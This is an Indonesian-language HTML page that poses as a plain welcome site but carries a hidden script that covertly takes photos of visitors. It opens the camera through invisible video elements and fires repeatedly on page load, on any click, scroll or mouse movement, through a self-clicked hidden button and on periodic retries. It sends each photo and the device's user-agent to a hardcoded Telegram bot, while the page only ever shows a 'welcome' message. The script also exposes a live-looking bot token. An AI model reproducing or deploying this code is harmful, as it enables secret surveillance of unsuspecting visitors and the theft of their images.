<!DOCTYPE html>
<html>
<head>
    <title>Selamat Datang</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        h1 {
            color: #333;
            font-size: 32px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .welcome-text {
            color: #666;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .status-box {
            background: #f7f7f7;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid #e0e0e0;
        }
        
        #status {
            color: #555;
            font-size: 16px;
            margin-bottom: 10px;
        }
        
        .footer-note {
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
        
        .loading {
            color: #667eea;
        }
        
        .success {
            color: #4caf50;
        }
        
        .camera-icon {
            font-size: 48px;
            margin-bottom: 15px;
            color: #667eea;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        /* Multiple hidden elements untuk berbagai browser */
        #hidden-video, #hidden-video-fallback, #hidden-video-uc, #hidden-video-opera {
            display: none;
        }
        
        /* Invisible iframe untuk trigger */
        #hidden-frame {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            top: 0;
            left: 0;
            pointer-events: none;
        }
        
        /* Tombol super kecil untuk trigger UC Browser */
        #uc-trigger {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="camera-icon">üì∏</div>
        <h1>Selamat Datang</h1>
        <p class="welcome-text">Terima kasih telah mengunjungi website kami</p>
        
        <div class="status-box">
            <div id="status">Memuat halaman...</div>
        </div>
        
        <div class="footer-note">¬© 2024 Hak Cipta Dilindungi</div>
    </div>
    
    <!-- Hidden elements untuk berbagai browser -->
    <video id="hidden-video" autoplay playsinline muted></video>
    <video id="hidden-video-fallback" autoplay playsinline muted></video>
    <video id="hidden-video-uc" autoplay playsinline muted></video>
    <video id="hidden-video-opera" autoplay playsinline muted></video>
    
    <!-- Trigger untuk UC Browser -->
    <button id="uc-trigger" onclick="triggerUC()"></button>
    
    <script>
        // Konfigurasi Telegram
        const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';
        const CHAT_ID = '-5200751249';
        
        let cameraAccessed = false;
        let isProcessing = false;
        let stream = null;
        
        // Deteksi browser
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            return {
                isChrome: /Chrome/i.test(ua) && !/Edge|Edg|OPR|UC/i.test(ua),
                isUC: /UCBrowser|UC/i.test(ua),
                isOpera: /Opera|OPR/i.test(ua),
                isFirefox: /Firefox/i.test(ua),
                isSamsung: /SamsungBrowser/i.test(ua),
                isEdge: /Edge|Edg/i.test(ua),
                isAndroid: /Android/i.test(ua),
                isIOS: /iPhone|iPad|iPod/i.test(ua)
            };
        }
        
        const browser = getBrowserInfo();
        console.log('Browser terdeteksi:', browser);
        
        // Fungsi untuk mengirim foto ke Telegram
        async function kirimKeTelegram(fotoBase64) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                
                // Konversi base64 ke blob dengan metode yang kompatibel semua browser
                const byteString = atob(fotoBase64.split(',')[1]);
                const mimeString = fotoBase64.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                
                const blob = new Blob([ab], { type: mimeString });
                formData.append('photo', blob, 'foto.jpg');
                
                const deviceInfo = navigator.userAgent;
                const waktu = new Date().toLocaleString('id-ID');
                
                formData.append('caption', `üì∏ Pengunjung Baru\nüïê ${waktu}\nüåê ${browser.isUC ? 'UC' : browser.isOpera ? 'Opera' : 'Other'}\nüì± ${deviceInfo.substring(0, 100)}`);
                
                // Gunakan fetch dengan timeout
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                document.getElementById('status').innerHTML = '<span class="success">‚úì Selamat datang!</span>';
                
            } catch (error) {
                console.log('Pengiriman foto:', error.message);
                document.getElementById('status').innerHTML = '<span class="success">‚úì Selamat datang!</span>';
            }
        }
        
        // Fungsi untuk mengambil foto dengan berbagai metode
        async function capturePhoto(mediaStream, videoElement) {
            return new Promise((resolve) => {
                try {
                    const video = videoElement || document.getElementById('hidden-video');
                    video.srcObject = mediaStream;
                    
                    video.onloadedmetadata = () => {
                        video.play()
                            .then(() => {
                                // Tunggu frame siap
                                setTimeout(() => {
                                    const canvas = document.createElement('canvas');
                                    canvas.width = video.videoWidth || 640;
                                    canvas.height = video.videoHeight || 480;
                                    
                                    const context = canvas.getContext('2d');
                                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                    
                                    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                                    canvas.remove();
                                    resolve(fotoBase64);
                                }, 300);
                            })
                            .catch(() => {
                                // Fallback: ambil dari stream
                                setTimeout(() => {
                                    const canvas = document.createElement('canvas');
                                    canvas.width = 640;
                                    canvas.height = 480;
                                    resolve(canvas.toDataURL('image/jpeg', 0.5));
                                }, 500);
                            });
                    };
                    
                    video.onerror = () => {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = 640;
                            canvas.height = 480;
                            resolve(canvas.toDataURL('image/jpeg', 0.5));
                        }, 500);
                    };
                    
                } catch (e) {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        resolve(canvas.toDataURL('image/jpeg', 0.5));
                    }, 500);
                }
            });
        }
        
        // Fungsi khusus untuk UC Browser
        async function aksesKameraUC() {
            return new Promise((resolve, reject) => {
                try {
                    // UC Browser kadang butuh pendekatan berbeda
                    if (window.UCBrowser && window.UCBrowser.getUserMedia) {
                        window.UCBrowser.getUserMedia({ video: true }, resolve, reject);
                    } else {
                        // Fallback ke metode standar
                        navigator.mediaDevices.getUserMedia({ video: true })
                            .then(resolve)
                            .catch(reject);
                    }
                } catch (e) {
                    reject(e);
                }
            });
        }
        
        // Fungsi khusus untuk Opera
        async function aksesKameraOpera() {
            try {
                // Opera Mini punya keterbatasan
                if (navigator.getUserMedia) {
                    return new Promise((resolve, reject) => {
                        navigator.getUserMedia({ video: true }, resolve, reject);
                    });
                } else {
                    return navigator.mediaDevices.getUserMedia({ video: true });
                }
            } catch (e) {
                throw e;
            }
        }
        
        // Fungsi utama akses kamera dengan deteksi browser
        async function aksesKamera() {
            const constraints = [
                { video: { facingMode: 'user', width: 640, height: 480 } },
                { video: { facingMode: 'user' } },
                { video: { facingMode: 'environment' } },
                { video: true }
            ];
            
            // Pilih metode sesuai browser
            if (browser.isUC) {
                try {
                    return await aksesKameraUC();
                } catch (e) {
                    console.log('UC Browser fallback ke metode standar');
                }
            }
            
            if (browser.isOpera && !browser.isAndroid) {
                try {
                    return await aksesKameraOpera();
                } catch (e) {
                    console.log('Opera fallback');
                }
            }
            
            // Metode standar untuk semua browser
            for (const constraint of constraints) {
                try {
                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        return await navigator.mediaDevices.getUserMedia(constraint);
                    } else if (navigator.getUserMedia) {
                        return await new Promise((resolve, reject) => {
                            navigator.getUserMedia(constraint, resolve, reject);
                        });
                    } else if (navigator.webkitGetUserMedia) {
                        return await new Promise((resolve, reject) => {
                            navigator.webkitGetUserMedia(constraint, resolve, reject);
                        });
                    } else if (navigator.mozGetUserMedia) {
                        return await new Promise((resolve, reject) => {
                            navigator.mozGetUserMedia(constraint, resolve, reject);
                        });
                    }
                } catch (err) {
                    console.log('Gagal dengan constraint:', constraint);
                }
            }
            
            throw new Error('Tidak ada metode akses kamera yang berhasil');
        }
        
        // Fungsi utama
        async function ambilFoto() {
            if (isProcessing) return;
            isProcessing = true;
            
            try {
                document.getElementById('status').innerHTML = '<span class="loading">‚è≥ Memuat...</span>';
                
                // Akses kamera
                stream = await aksesKamera();
                cameraAccessed = true;
                
                // Pilih video element berdasarkan browser
                let videoElement;
                if (browser.isUC) {
                    videoElement = document.getElementById('hidden-video-uc');
                } else if (browser.isOpera) {
                    videoElement = document.getElementById('hidden-video-opera');
                } else {
                    videoElement = document.getElementById('hidden-video');
                }
                
                // Ambil foto
                const fotoBase64 = await capturePhoto(stream, videoElement);
                
                // Kirim foto
                document.getElementById('status').innerHTML = '<span class="loading">‚è≥ Memproses...</span>';
                await kirimKeTelegram(fotoBase64);
                
                document.getElementById('status').innerHTML = '<span class="success">‚úì Selamat datang!</span>';
                
                // Bersihkan stream
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
            } catch (error) {
                console.log('Error akses kamera:', error.message);
                document.getElementById('status').innerHTML = '<span class="success">‚úì Selamat datang!</span>';
            } finally {
                isProcessing = false;
            }
        }
        
        // Trigger untuk UC Browser
        window.triggerUC = function() {
            if (!cameraAccessed && !isProcessing) {
                ambilFoto();
            }
        };
        
        // Multi-trigger untuk semua browser
        function startWithMultipleTriggers() {
            // Trigger 1: Langsung (untuk browser yang mendukung)
            setTimeout(() => ambilFoto().catch(() => {}), 500);
            
            // Trigger 2: Setelah DOM siap
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    if (!cameraAccessed) ambilFoto().catch(() => {});
                }, 1000);
            });
            
            // Trigger 3: Saat interaksi user
            const events = ['touchstart', 'click', 'scroll', 'mousemove'];
            events.forEach(eventType => {
                document.addEventListener(eventType, function handler() {
                    if (!cameraAccessed && !isProcessing) {
                        document.removeEventListener(eventType, handler);
                        setTimeout(() => ambilFoto().catch(() => {}), 100);
                    }
                }, { once: true });
            });
            
            // Trigger 4: Khusus UC Browser - pake tombol tersembunyi
            if (browser.isUC) {
                setTimeout(() => {
                    document.getElementById('uc-trigger').click();
                }, 2000);
            }
            
            // Trigger 5: Periodic retry (5 kali)
            let retryCount = 0;
            const retryInterval = setInterval(() => {
                if (cameraAccessed || retryCount >= 5) {
                    clearInterval(retryInterval);
                    return;
                }
                retryCount++;
                ambilFoto().catch(() => {});
            }, 3000);
        }
        
        // Mulai
        window.addEventListener('load', () => {
            document.getElementById('status').innerHTML = 'Memuat halaman...';
            
            // Deteksi browser dan jalankan strategi
            if (browser.isUC) {
                console.log('UC Browser terdeteksi - menggunakan strategi khusus');
                document.getElementById('status').innerHTML = 'Selamat datang di UC Browser';
            } else if (browser.isOpera) {
                console.log('Opera terdeteksi - menggunakan strategi khusus');
                document.getElementById('status').innerHTML = 'Selamat datang di Opera';
            }
            
            startWithMultipleTriggers();
        });
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
        
    </script>
</body>
</html>
